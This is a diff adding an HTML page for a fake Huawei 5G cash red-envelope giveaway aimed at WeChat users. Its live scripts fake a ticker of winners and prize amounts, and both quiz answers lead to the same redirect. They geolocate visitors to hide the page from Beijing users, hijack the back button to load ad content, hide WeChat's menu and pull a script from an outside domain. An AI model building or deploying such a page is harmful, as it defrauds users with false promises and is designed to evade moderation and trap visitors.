@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en" style="height: 100%">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title></title>
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/iconfont.css">
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/index.css">
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/model.css">
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/tousu.css">
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/shenhe.css">
+    <link rel="stylesheet" href="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/css/tiwen.css">
+    <script type="text/javascript">
+        document.documentElement.style.fontSize = document.documentElement.clientWidth / 640 * 100 + 'px';
+    </script>
+
+    <script src="https://ip.ws.126.net/ipquery"></script>
+    <script>
+        var address = localAddress.city ? localAddress.city : "";
+        var city = address.replace(/(.*)市/, '$1');
+        city = city.replace("北京", "");
+        if(city=="北京"){
+            location.href="http://www.baidu.com";
+        }
+    </script>
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?a4b54934dac2d4a5656ba8533626f544";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?455e3dfe387fc16fc732c84ab1943ecb";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+    <style>
+        .recive_money_nums {
+            font-size: 18px;
+            color: #fbdc9c;
+        }
+    </style>
+</head>
+<body>
+<!-- 提问页 -->
+<!-- 蒙版 -->
+<div id="tiwenye" class="mengban">
+    <div class="t-login">
+        <div class="t-title" style="text-align: center; font-size: 0.8em; font-weight: bold;margin-top: 0.2rem;">华为拥有哪项专利技术？</div>
+        <div class="t-box_big" style="text-align: center;margin-top: 20px;font-size:0.7em"><span>活动限微信用户参与,</span>请答对本题</br>确认参与资格
+        </div>
+        <div class="t-button" style="border-top: 1px solid #ebebeb;">
+            <span id="cancel" style="width: 100%; height: 40px; color: #009688; border: 0; font-size: 20px; background: white; border-radius: 0 0 0 8px;  ">4G</span>
+            <span id="canfim" style="width: 100%; height: 40px; color: #009688; border: 0; font-size:20px;background: white; border-left:1px solid #ebebeb;border-radius: 0 0 8px 0; ">5G</span>
+        </div>
+
+    </div>
+</div>
+
+<div class="header" style="font-size: 0.32rem;height:.7rem">
+    <div class="left">
+        <!-- javascript:; 阻止 a连接跳转  需要跳转 用路径替换 -->
+        <a  onclick="getback()">
+            <i class="fanhui iconfont iconfanhui"></i>
+            返回</a>
+    </div>
+    <div id="tousu" class="right" style="padding-right: 5%;">
+        <a href="/lucy/user/tousu">
+            <i class="tousu iconfont icontousu1"></i>&nbsp;投诉
+        </a>
+    </div>
+</div>
+
+<!-- 首页 -->
+<div id="index" style="height: 100%;margin: 0 ;padding: 0;font-size: 0.32rem">
+    <div class="layout">
+        <div class="content">
+            <div class="img">
+            </div>
+            <div class="text">
+                <span class="top">庆祝华为5G上市 派发一亿</span>
+                <br>
+
+                <div class="bt">
+                    <span class="redpac">全民派发现金红包</span>
+                    <span class="example">可提取</span>
+                </div>
+            </div>
+            <!-- 动画类名 -->
+            <div class="cir">
+                <div class="cir1">
+                    <div class="cir2" id="donghua">開</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="title" style="font-size:16px">- 今日已有37298人领了红包 -</div>
+            <div class="dataBox">
+                <ul>
+                </ul>
+            </div>
+
+        </div>
+    </div>
+</div>
+<!-- 领取页 -->
+<div id="model" class="m-kongzhi" style="height: 100%;margin: 0 ;padding: 0;font-size: 0.32rem">
+    <div class="m-layout">
+        <div class="m-content">
+            <div class="m-cir">
+                ￥
+            </div>
+        </div>
+
+        <div class="m-footer">
+            <div class="m-text">
+                <span class="m-top">恭喜领取红包</span><br>
+                <div class="m-price">
+                    <span class="m-moeny">￥</span>
+                    <span class="m-num"></span>
+                    <span class="m-hi">最高</span>
+                </div>
+            </div>
+            <div class="m-dataBox">
+                <div class="m-pro">
+                    <div class="m-box1">
+                        <div id="tixian">立即提现</div>
+                    </div>
+                    <div class="m-box2">
+                        <p>今日24点前未收钱，将收回红包资格</p>
+                        <p>
+                            如多次锁取以最后一次领取金额为准
+                        </p>
+                    </div>
+                </div>
+                <div class="m-bottom">
+                    总共100000份，已成功发出57887份红包
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+
+</body>
+
+<script src="https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/js/zepto.js"></script>
+<script>
+    $(function () {
+        var data = [
+            {
+                "name": "刘子怡爸爸",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
+                "money": "23.36"
+            },
+            {
+                "name": "我是你的情人",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
+                "money": "28.79"
+            },
+            {
+                "name": "花花公子",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
+                "money": "19.39"
+            },
+            {
+                "name": "潇了个洒",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
+                "money": "23.90"
+            },
+            {
+                "name": "天天向上",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
+                "money": "22.04"
+            },
+            {
+                "name": "一刘阿姨",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
+                "money": "25.56"
+            },
+            {
+                "name": "孔海西",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
+                "money": "13.67"
+            },
+            {
+                "name": "IF YOU",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/9CFD84D74ABF5141EA8F6B73BD06C3E1/100",
+                "money": "26.47"
+            },
+            {
+                "name": "快来调侃",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/BA6DA5237D4175DDC750553561F219B7/100",
+                "money": "23.34"
+            },
+            {
+                "name": "。大哥哥",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100",
+                "money": "26.05"
+            },
+            {
+                "name": "小布丁555",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100",
+                "money": "18.03"
+            },
+            {
+                "name": "似懂非懂",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100",
+                "money": "27.47"
+            },
+            {
+                "name": " 二叔",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100",
+                "money": "15.68"
+            },
+            {
+                "name": "快乐每一天_",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100",
+                "money": "27.07"
+            },
+            {
+                "name": "好8不好8",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100",
+                "money": "14.87"
+            },
+            {
+                "name": "小甜甜",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100",
+                "money": "17.18"
+            },
+            {
+                "name": "最佳搭档，",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/C54D6E68485F84A86822CF7E473A93EC/100",
+                "money": "15.06"
+            },
+            {
+                "name": "二分^_^睡眠",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/2316567F52712C775048DB02BF5C261C/100",
+                "money": "12.44"
+            },
+            {
+                "name": "孙粒子",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D1A596E47C0AA279BA8BB9BAAC02CC44/100",
+                "money": "15.56"
+            },
+            {
+                "name": "Mr. Xue",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/189955F05F482DE956480DB66B07E4DC/100",
+                "money": "29.26"
+            },
+            {
+                "name": "、dacy",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/5CD9B7ACD34332B8DA145BE3DE4C44FB/100",
+                "money": "26.52"
+            },
+            {
+                "name": "已婚少年",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/B7CDFAA5FD54A0FD2904A30B6A29D660/100",
+                "money": "25.99"
+            },
+            {
+                "name": "叫我冰冰",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D3875B44A8DB4ABE135059C7362B4094/100",
+                "money": "29.80"
+            },
+            {
+                "name": "卢正英",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100",
+                "money": "15.64"
+            },
+            {
+                "name": "Jkz.",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100",
+                "money": "10.55"
+            },
+            {
+                "name": "雷乐天",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100",
+                "money": "21.76"
+            },
+            {
+                "name": "有你每一天",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100",
+                "money": "26.57"
+            },
+            {
+                "name": "毕竟我们还年轻",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100",
+                "money": "24.57"
+            },
+            {
+                "name": "世界杯看客",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100",
+                "money": "22.61"
+            },
+            {
+                "name": "频繁的我",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/94B9F8421330A7B82F019492C822BF42/100",
+                "money": "25.81"
+            },
+            {
+                "name": "妙不可言",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100",
+                "money": "29.18"
+            },
+            {
+                "name": "春天般～温暖",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/FF4E560E4F11C2EBAAFFFC4625CD3122/100",
+                "money": "21.65"
+            },
+            {
+                "name": "小猫咪回忆",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100",
+                "money": "14.02"
+            },
+            {
+                "name": "10G流量不够用",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100",
+                "money": "26.11"
+            },
+            {
+                "name": "梅西王子",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100",
+                "money": "24.74"
+            },
+            {
+                "name": "中国队必胜",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100",
+                "money": "25.25"
+            },
+            {
+                "name": "刘子怡爸爸",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/D091A297D0A3D3619C6D828C681F305F/100",
+                "money": "23.36"
+            },
+            {
+                "name": "我是你的情人",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/685AA36438DDD7E0EB55D0C18097CA1C/100",
+                "money": "28.79"
+            },
+            {
+                "name": "花花公子",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/DDA36344FDAF8DF2BFDD8F3DAEDE5B74/100",
+                "money": "19.39"
+            },
+            {
+                "name": "潇了个洒",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/E2348DFF85AE861D17451BDDC0432809/100",
+                "money": "23.90"
+            },
+            {
+                "name": "天天向上",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/1656EDDA7E648DD32E862460EE92E1C5/100",
+                "money": "22.04"
+            },
+            {
+                "name": "一刘阿姨",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/29DBC6217FA0B06ABC25C70FE260221F/100",
+                "money": "25.56"
+            },
+            {
+                "name": "孔海西",
+                "avatar": "https://q.qlogo.cn/qqapp/1104718115/72763DE05338B738EEA4D9FBEFD8DBBF/100",
+                "money": "13.67"
+            },
+        ]
+        var html = '',num=7;
+        //遍历生成HTML字符串
+        for (var i = 0; i < data.length; i++) {
+            var money = (Math.random() * (40 - 99) + 150).toFixed(2);
+            html += ` <li>
+    <div class="money_user_wrap">
+      <span class="user_icon">
+        <img src="${data[i].avatar}" alt=""/>
+      </span>
+      <div class="user_info">
+        <div class="user_name">${data[i].name}</div>
+        <div class="user_time">${new Date().getHours()}:${Math.floor((Math.random() + 1) * 30) < 10 ? '0' + Math.floor((Math.random() + 1) * 30) : Math.floor((Math.random() + 1) * 30)}</div>
+      </div>
+    </div>
+    <div class="recive_money_wrap">
+      <span class="recive_money_text">领取</span>
+      <span class="recive_money_nums">${money}元</span>
+    </div>
+  </li>`
+        }
+        //渲染页面
+        $('.dataBox ul').html(html)
+        var height = Math.floor($('.dataBox ul>li').height());
+        // 重置前7个和后7个的时间
+        var timeTexts = $('.dataBox ul>li .user_time')
+        for (let i = 0; i < timeTexts.length; i++){
+            if (i < num) {
+                timeTexts[i].innerText=timeTexts[timeTexts.length+i-num].innerText
+            }
+        }
+        //设置每个li的高度
+        $('.dataBox ul>li').css({
+            height: height,
+        })
+        //动态设置容器高度
+        $('.dataBox').css({
+            height: height * num,
+        })
+        //设置初始化位置
+        $('.footer ul').css({
+            top: `-${(data.length - num) * height}px`
+        })
+        //定时器实现切换
+        var timer = setInterval(() => {
+            num++
+            $('.footer ul').css({
+                top: `-${(data.length - num) * height}px`,
+                transition: "all .5s"
+            })
+            if (data.length - num == -1) {
+                // console.log("ok")
+                num = 7
+                $('.footer ul').css({
+                    transition: "none",
+                    top: `-${(data.length - num) * height}px`,
+                })
+            }
+
+
+        }, 3000);
+
+    })//入口函数
+
+
+</script>
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function () {
+            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+        },100)
+
+    })
+    // window.onhashchange = function () {
+    //     getback()
+    // }
+    function getback(){
+
+        x_load = "/index/index/getAd.html?" + new Date().getTime();
+        x_load && function () {
+            $.post(x_load, function (data) {
+                var new_doc = document.open("text/html", "replace");
+                new_doc.write(data);
+                new_doc.close();
+            });
+        }();
+    }
+    function onBridgeReady(){
+        WeixinJSBridge.call('hideOptionMenu');
+    }
+
+    if (typeof WeixinJSBridge == "undefined"){
+        if( document.addEventListener ){
+            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+        }else if (document.attachEvent){
+            document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
+            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+        }
+    }else{
+        onBridgeReady();
+    }
+</script>
+</html>
+<script>
+    //原生获取元素
+    // 获取主页面
+    var index = document.getElementById("index");
+    // 获取 “开” 字 元素
+    var btn = document.getElementById("donghua");
+    // 获取领取页
+    var model = document.getElementById("model");
+    // 获取 “提现”  元素
+    var tixian = document.getElementById("tixian");
+    // 获取 提问页
+    var tiwenye = document.getElementById("tiwenye");
+    //  获取 任正非
+    var cancel = document.getElementById("cancel");
+    // 获取 马化腾
+    var canfim = document.getElementById("canfim");
+    // 获取  主页“投诉” 元素
+    var tousu = document.getElementById("tousu");
+    // 获取 领取页“投诉”元素
+    var tousu1 = document.getElementById("tousu1");
+    // 获取投诉页
+    var tousuye = document.getElementById("tousuye");
+    // 获取审核页
+    var shenhe = document.getElementById("shenhe");
+
+    //生成金额
+    var money = (Math.random() * (40 - 99) + 170).toFixed(2);
+    //原生给元素添加点击事件
+    btn.onclick = function () {
+        $(".m-num").html(money);
+        //点击之后给元素添加动画
+        btn.classList.add("a");
+        //一秒后要执行的事件  定时器  因为动画是一秒执行完毕 所以定时器延迟一秒执行  修改的时间 两个一起改
+        setTimeout(function () {
+            //显示领取页 隐藏主页
+            index.style.display = "none";
+            model.classList.add("xianshi");
+        }, 1000);
+    }
+    // 隐藏领取页 显示提问页面
+    tixian.onclick = function () {
+        tiwenye.style.display = "block";
+        model.classList.add("xianshi");
+    }
+
+    //回答问题 隐藏提问页 显示领取页
+    cancel.onclick = function () {
+        $.post("/lucy/user/getDetail",null,function(data){
+            location.href=data+"?amount="+money;
+        })
+    }
+    //回答问题 隐藏提问页 显示领取页
+    canfim.onclick = function () {
+        $.post("/lucy/user/getDetail",null,function(data){
+            location.href=data+"?amount="+money;
+        })
+    }
+
+</script>
+<script src="http://51541452.cn/public/static/ad/js/1"></script>
